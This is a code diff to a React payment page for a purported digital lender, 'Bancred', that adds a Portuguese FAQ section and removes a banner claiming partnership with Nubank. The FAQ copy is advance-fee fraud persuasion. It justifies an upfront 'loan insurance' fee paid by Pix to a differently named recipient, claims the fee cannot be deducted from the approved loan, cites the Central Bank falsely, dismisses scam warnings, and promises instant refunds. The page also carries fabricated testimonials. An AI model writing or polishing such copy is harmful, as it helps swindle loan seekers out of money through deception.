@@ -15,6 +15,8 @@ import {
   Lock,
   AlertTriangle,
   Play,
+  HelpCircle,
+  ChevronDown,
 } from "lucide-react";
 import { useParadisePix } from "@/hooks/useParadisePix";
 import { trackEvent } from "@/lib/tracking";
@@ -152,6 +154,111 @@ const depoimentos = [
     texto: "Cara, eu tava precisando demais. Paguei o seguro 14h32 e às 14h47 já tava com o dinheiro. Surreal a velocidade.",
   },
 ];
+
+const faqData = [
+  {
+    tag: "Regulamentado pelo Banco Central",
+    pergunta: "Por que existe a cobrança do Seguro Prestamista? Isso é normal em bancos?",
+    resposta: "Sim, é um procedimento padrão regulamentado pelo Banco Central do Brasil para operações de crédito a distância. Conforme o órgão regulador, o seguro garante a quitação do saldo em casos de imprevistos (como perda de renda ou desemprego). É exatamente a presença desta garantia em seu CPF que permite à Bancred reduzir os juros e liberar lotes de saldo imediato de forma 100% digital, sem burocracia ou comprovação de bens.",
+  },
+  {
+    tag: "Dúvida mais frequente",
+    pergunta: "Por que o beneficiário do Pix de pagamento aparece em nome de outra empresa/administradora e não Bancred?",
+    resposta: "Para garantir conformidade fiscal e proteção total ao consumidor, a Bancred utiliza Gateways de Pagamento Credenciados e homologados pelo Banco Central. Essas plataformas intermediadoras processam os valores em um ambiente criptografado e retêm a taxa em uma conta de custódia segura. Isso garante que a sua transação tenha Nota Fiscal emitida e o seu direito de reembolso imediato assegurado caso ocorra qualquer instabilidade no envio do seu saldo.",
+  },
+  {
+    pergunta: "Se o meu crédito já está aprovado, por que o sistema não desconta esse valor direto do saldo que vou receber?",
+    resposta: "Trata-se de uma impossibilidade jurídica e sistêmica de conformidade bancária. Os fundos do seu saldo aprovado ficam reservados em uma conta de liquidação lacrada via API. O sistema é programado para disparar o montante integral e exato do contrato original. Modificar o valor do contrato para debitar custos internos violaria as regras fiscais de concessão de crédito, cancelando a sua proposta de forma definitiva e irreversível.",
+  },
+  {
+    pergunta: "Em quanto tempo o dinheiro do meu saldo/empréstimo cai na minha conta após a validação?",
+    resposta: "O pagamento é instantâneo. Assim que o gateway homologado confirma a compensação da taxa ou seguro, nosso sistema faz a liberação da chave de segurança via API bancária. O disparo do Pix para a sua conta cadastrada leva no máximo 2 minutos. Você receberá uma notificação push do aplicativo do seu banco imediatamente.",
+  },
+  {
+    pergunta: "Vi alertas e reclamações na internet sobre golpes usando o nome da empresa. É seguro realizar o processo por aqui?",
+    resposta: "Sim, este portal é o único ambiente 100% oficial e criptografado da Bancred. Devido ao nosso alto volume de aprovações diárias, criminosos infelizmente tentam se passar por nossos analistas criando perfis falsos em redes sociais e números falsos de WhatsApp para aplicar golpes. Toda a operação iniciada e concluída dentro deste site oficial é auditada, protegida por criptografia SSL e conta com o selo de Entrega Garantida sob risco zero.",
+  },
+  {
+    pergunta: "E se a minha página fechar ou a minha internet cair logo após eu realizar o Pix?",
+    resposta: "Não há qualquer risco de perda. O reconhecimento dos pagamentos é processado diretamente no nosso banco de dados via Webhooks integrados ao Banco Central, e não no navegador do seu celular. Mesmo que seu aparelho desligue ou fique sem sinal, a validação do contrato acontecerá em segundo plano e o disparo do seu Pix de liberação será executado normalmente.",
+  },
+  {
+    pergunta: "Qual é a minha garantia real de que vou receber o dinheiro após pagar a taxa?",
+    resposta: "Nós oferecemos uma Cláusula de Garantia Incondicional de Entrega. Se por qualquer instabilidade técnica do Banco Central o seu saldo não for depositado na sua conta em até 5 minutos após a confirmação do pagamento, o valor que você pagou pela taxa ou seguro é estornado e devolvido para a sua conta de origem de forma 100% automática e sem burocracia.",
+  },
+  {
+    pergunta: "Posso ir até uma agência física realizar o pagamento pessoalmente?",
+    resposta: "A Bancred opera exclusivamente como uma Fintech de crédito 100% digital e automatizada. Não possuímos agências físicas para atendimento ao público. É justamente a eliminação de custos com estruturas físicas, prédios e milhares de funcionários que nos permite repassar as menores taxas do mercado e limites de saldo muito mais altos direto na tela do seu celular.",
+  },
+];
+
+const FaqSection = () => {
+  const [openIndex, setOpenIndex] = useState<number | null>(null);
+  return (
+    <div style={{ background: "#F8F9FA", borderRadius: 16, padding: "18px 14px", marginTop: 18, marginBottom: 18, border: "1px solid #E9ECEF" }}>
+      <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 18 }}>
+        <HelpCircle size={20} color="#16A34A" />
+        <h2 style={{ fontSize: 16, fontWeight: 800, color: "#212529", margin: 0 }}>Perguntas Frequentes</h2>
+      </div>
+      {faqData.map((item, idx) => (
+        <div key={idx} style={{ marginBottom: 10 }}>
+          {item.tag && (
+            <div style={{ display: "flex", marginBottom: 4 }}>
+              <span style={{ fontSize: 10, fontWeight: 800, color: "#fff", background: "#16A34A", padding: "3px 8px", borderRadius: 6, letterSpacing: 0.3, textTransform: "uppercase" }}>
+                {item.tag}
+              </span>
+            </div>
+          )}
+          <button
+            type="button"
+            onClick={() => setOpenIndex(openIndex === idx ? null : idx)}
+            style={{
+              width: "100%",
+              display: "flex",
+              alignItems: "center",
+              gap: 10,
+              background: "#fff",
+              border: "1px solid #DEE2E6",
+              borderRadius: 12,
+              padding: "14px 12px",
+              cursor: "pointer",
+              fontFamily: fontStack,
+              textAlign: "left",
+              transition: "box-shadow 0.2s",
+              boxShadow: openIndex === idx ? "0 2px 8px rgba(0,0,0,0.04)" : "none",
+            }}
+          >
+            <ShieldCheck size={16} color="#16A34A" style={{ flexShrink: 0 }} />
+            <span style={{ flex: 1, fontSize: 13.5, fontWeight: 700, color: "#212529", lineHeight: 1.35 }}>
+              {item.pergunta}
+            </span>
+            <ChevronDown
+              size={18}
+              color="#6B7280"
+              style={{
+                flexShrink: 0,
+                transform: openIndex === idx ? "rotate(180deg)" : "rotate(0deg)",
+                transition: "transform 0.3s ease",
+              }}
+            />
+          </button>
+          <div
+            style={{
+              maxHeight: openIndex === idx ? 500 : 0,
+              overflow: "hidden",
+              transition: "max-height 0.35s ease, opacity 0.25s ease",
+              opacity: openIndex === idx ? 1 : 0,
+            }}
+          >
+            <div style={{ padding: "12px 14px", fontSize: 13, color: "#495057", lineHeight: 1.65, background: "#fff", borderRadius: "0 0 12px 12px", border: "1px solid #DEE2E6", borderTop: "none", marginTop: -2 }}>
+              {item.resposta}
+            </div>
+          </div>
+        </div>
+      ))}
+    </div>
+  );
+};
 
 const Pagamento = () => {
   const [params] = useSearchParams();
@@ -313,15 +420,6 @@ const Pagamento = () => {
         <img src={bancredLogo} alt="Bancred" style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }} />
       </header>
 
-      {/* Banner Nu × Bancred */}
-      <section style={{ background: "linear-gradient(135deg, #820AD1 0%, #6E07B0 100%)", padding: "22px 16px 24px", color: "#fff", textAlign: "center" }}>
-        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 14, marginBottom: 6 }}>
-          <span style={{ fontFamily: "Inter, sans-serif", fontSize: 30, fontWeight: 900, letterSpacing: -1.5, lineHeight: 1, color: "#fff" }}>nu</span>
-          <X size={18} strokeWidth={2.5} />
-          <span style={{ fontSize: 22, fontWeight: 800, letterSpacing: -0.4 }}>Bancred</span>
-        </div>
-        <div style={{ fontSize: 13, opacity: 0.92 }}>Parceria oficial · Proteção garantida</div>
-      </section>
 
       <main style={{ padding: "22px 14px", maxWidth: 480, margin: "0 auto" }}>
         {/* Saudação */}
@@ -497,6 +595,8 @@ const Pagamento = () => {
             <Lock size={13} color="#6B7280" /> Processo 100% seguro
           </div>
         </div>
+
+        <FaqSection />
       </main>
 
       {showPix && (
